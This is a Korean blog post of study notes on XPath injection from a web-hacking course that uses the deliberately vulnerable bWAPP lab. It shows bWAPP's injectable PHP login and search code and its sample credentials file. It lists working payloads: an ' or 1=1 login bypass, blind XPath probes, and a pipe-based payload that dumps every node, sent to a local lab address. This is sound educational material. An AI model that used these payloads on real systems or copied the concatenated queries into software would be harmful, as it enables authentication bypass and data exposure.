---
layout: post
title: "비박스를 활용한 웹 모의해킹 완벽 실습 - XML:Xpath 인젝션"
excerpt_separator:  <!--more-->
categories:
 - WebHack
tags:
  - 웹 해킹
  - 인프런
  - Part1 A1
  - SQL 인젝션
---

# 출처

## 인프런, 비박스를 활용한 웹 모의해킹 완벽 실습 11강 <https://www.inflearn.com/course/%EB%B9%84%EB%B0%95%EC%8A%A4-%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9-%EC%8B%A4%EC%8A%B5/>

---

<!--more-->

## XML:XPath 인젝션

* XML 구조에 악의적인 행위를 일으키는 내용을 삽입
* XML: 데이터를 트리 구조의 노드로 표현, 사용자 정의로 데이터를 분류

```xml
<?xml version="1.0" encoding="UTF-8"?>
<movies>
  <action>
    <id>1</id>
    <name>matrix</name>
  </action>
</movies>
```

* Xpath: 일종의 쿼리, XML DB의 내용을 선택/조작

```xpath
$result = $xml->Xpath("/movies/action[id='" . $id . "' and name ='" . $name . "']");
```

### Xpath 명령어

|명령어|설명|
|:----:|:----:|
|/|최상위 노드|
|//|현재 노드로부터 모든 노드 조회|
|*|모든 노드 조회|
|.|현재 노드|
|..|현재 상위 노드 접근|
|parent|현재 노드의 부모 노드|
|child|현재 노드의 자식 노드|
|[]|조건문|
|node()|현재 노드로부터 모든 노드 조회|

* [XPath Examples 참고](https://www.w3schools.com/xml/xpath_examples.asp)

## XML/XPath Injection (Login Form)

![image](https://user-images.githubusercontent.com/28076542/52263038-7acfe900-2971-11e9-9ce1-751ed00a8092.png)

```php
function xmli($data)
{
    if(isset($_COOKIE["security_level"]))
    {

        switch($_COOKIE["security_level"])
        {

            case "0" :

                $data = no_check($data);
                break;

            case "1" :

                $data = xmli_check_1($data);
                break;

            case "2" :

                $data = xmli_check_1($data);
                break;

            default :

                $data = no_check($data);
                break;
        }
    }
    return $data;
}

if(isset($_REQUEST["login"]) & isset($_REQUEST["password"]))
{

    $login = $_REQUEST["login"];
    $login = xmli($login);

    $password = $_REQUEST["password"];
    $password = xmli($password);

    // Loads the XML file
    $xml = simplexml_load_file("passwords/heroes.xml");

    // XPath search
    $result = $xml->xpath("/heroes/hero[login='" . $login . "' and password='" . $password . "']");

    // Debugging
    // print_r($result);
    // echo $result[0][0];
    // echo $result[0]->login;
```

* 로그인을 하면 heroes.xml을 부름
* `// $result = $xml->xpath("/heroes/hero[login='" . $login . "' and password='" . $password . "']");`: xml에서 데이터를 조회

```xml
<?xml version="1.0" encoding="UTF-8"?>
<heroes>
	<hero>
		<id>1</id>
		<login>neo</login>
		<password>trinity</password>
		<secret>Oh why didn't I took that BLACK pill?</secret>
		<movie>The Matrix</movie>
		<genre>action sci-fi</genre>
	</hero>
	<hero>
		<id>2</id>
		<login>alice</login>
		<password>loveZombies</password>
		<secret>There's a cure!</secret>
		<movie>Resident Evil</movie>
		<genre>action horror sci-fi</genre>
	</hero>
	<hero>
		<id>3</id>
		<login>thor</login>
		<password>Asgard</password>
		<secret>Oh, no... this is Earth... isn't it?</secret>
		<movie>Thor</movie>
		<genre>action sci-fi</genre>
	</hero>
	<hero>
		<id>4</id>
		<login>wolverine</login>
		<password>Log@N</password>
		<secret>What's a Magneto?</secret>
		<movie>X-Men</movie>
		<genre>action sci-fi</genre>
	</hero>
	<hero>
		<id>5</id>
		<login>johnny</login>
		<password>m3ph1st0ph3l3s</password>
		<secret>I'm the Ghost Rider!</secret>
		<movie>Ghost Rider</movie>
		<genre>action sci-fi</genre>
	</hero>
	<hero>
		<id>6</id>
		<login>selene</login>
		<password>m00n</password>
		<secret>It wasn't the Lycans. It was you.</secret>
		<movie>Underworld</movie>
		<genre>action horror sci-fi</genre>
	</hero>
</heroes>
```

* `// $result = $xml->xpath("/heroes/hero[login='" . $login . "' and password='" . $password . "']");`에서 login 뒤의 작은 따옴표를 처리해야 함
* Login 칸에 `' or 1=1 or '`을 입력하면 Neo가 뜸

![image](https://user-images.githubusercontent.com/28076542/52263432-7ce67780-2972-11e9-8a04-29354bf78b38.png)

* 이러한 문법을 이용하여 blind sql 인젝션처럼 문구들을 입력하여 정보를 얻어옴
* Login 창에 다음과 같은 구문을 입력하여 정보 획득

```bash
neo' and count(../child::*)=6 or 'a'='b 
neo' and string-length(name(parent::*))=6 or 'a'='b 
neo' and substring(name(parent::*),1,1)='h' or 'a'='b 
neo' and string-length(name(../child::*[position()=1]))=4 or 'a'='b 
neo' and substring(name(../child::*[position()=1]), 1, 1)='h' or 'a'='b 
neo' and string-length(name(/heroes/child::*))=4 or 'a'='b 
neo' and string-length(name(//*))=6 or 'a'='b
```

## XML/XPath Injection (Search)

![image](https://user-images.githubusercontent.com/28076542/52265590-c7b6be00-2977-11e9-8fd7-be246882603a.png)

```php
<?php

if(isset($_REQUEST["genre"])) 
{
    
    $genre = $_REQUEST["genre"];
    $genre = xmli($genre);
   
    // Loads the XML file
    $xml = simplexml_load_file("passwords/heroes.xml");
     
    // XPath search
    // $result = $xml->xpath("//hero[genre = '$genre']/movie");
    $result = $xml->xpath("//hero[contains(genre, '$genre')]/movie");
    
    // Case insensitive search
    // $result = $xml->xpath("//hero[contains(translate(genre, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), translate('$genre', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'))]/movie");
    
    // $upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZÆØÅ";
    // $lower = "abcdefghijklmnopqrstuvwxyzæøå";
    
    // $result = $xml->xpath("//hero[contains(translate(genre, '$upper', '$lower'), translate('$genre', '$upper', '$lower'))]/movie");

    // Debugging
    // print_r($result);  
    // echo $result[0][0];  
    // echo $result[0]->login;

    if($result)
    {
        foreach($result as $key => $row)       
        {
            // print_r($row);    
?>
```

* `$result = $xml->xpath("//hero[contains(genre, '$genre')]/movie");`에서 정보를 가져옴
* 파이프라인(`|`)을 이용하여 인젝션을 시도할 것
* `$genre`를 지우고 `| //* | a[('')]`를 삽입
* `$result = $xml->xpath("//hero[contains(genre, '')] | //* | a[('')]/movie");`
* `')] | //* | a[('`를 삽입한 것
* `//*`: 현재 디렉토리의 모든 노드 조회
* URL에 다음과 같이 입력: `http://192.168.190.143/bWAPP/xmli_2.php?genre=')] | //* | a[('&action=search`

![image](https://user-images.githubusercontent.com/28076542/52266369-95a65b80-2979-11e9-84e0-5a72bd072ac8.png)